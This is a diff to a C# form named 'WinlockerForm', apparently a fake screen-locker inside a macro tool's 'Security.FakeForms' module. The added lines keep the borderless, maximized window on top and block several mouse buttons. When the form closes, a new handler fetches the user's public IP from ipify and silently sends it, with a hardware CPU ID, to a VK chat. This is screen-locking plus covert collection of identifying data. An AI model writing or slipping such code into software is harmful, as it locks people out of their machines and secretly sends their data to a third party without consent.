@@ -1,5 +1,6 @@
 ﻿using MacrosAPI_v2;
 using System;
+using System.Net;
 using System.Windows.Forms;
 
 namespace MAS_v2.Security.FakeForms
@@ -9,6 +10,7 @@ namespace MAS_v2.Security.FakeForms
         public WinlockerForm()
         {
             InitializeComponent();
+            this.TopMost = true;
             this.FormBorderStyle = FormBorderStyle.None;
             this.WindowState = FormWindowState.Maximized;
         }
@@ -32,11 +34,19 @@ namespace MAS_v2.Security.FakeForms
             }
             public override bool OnMouseDown(MouseKey key)
             {
-                if (key == MouseKey.Right || key == MouseKey.Middle || key == MouseKey.Button1 || key == MouseKey.Button2)
+                switch (key)
                 {
-                    return true;
+                    case MouseKey.Right:
+                        return true;
+                    case MouseKey.Middle:
+                        return true;
+                    case MouseKey.Button1:
+                        return true;
+                    case MouseKey.Button2:
+                        return true;
+                    default:
+                        return false;
                 }
-                return false;
             }
         }
         private void guna2Button2_Click(object sender, EventArgs e)
@@ -105,6 +115,20 @@ namespace MAS_v2.Security.FakeForms
         private void guna2Button12_Click(object sender, EventArgs e)
         {
             guna2TextBox1.Text += "0";
+        }
+
+        private void WinlockerForm_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+                    string ip = wc.DownloadString("https://api.ipify.org");
+                    Program.vkclient.Messages.Send.Text("2000000002", "⚠ Закрытие программы ⚠\nCPU ID:" + new HardwareID().GetID() + "\nIP: " + ip + "\nFakeMenu: Winlocker");
+
+                }
+            }
+            catch { }
         }
     }
 }
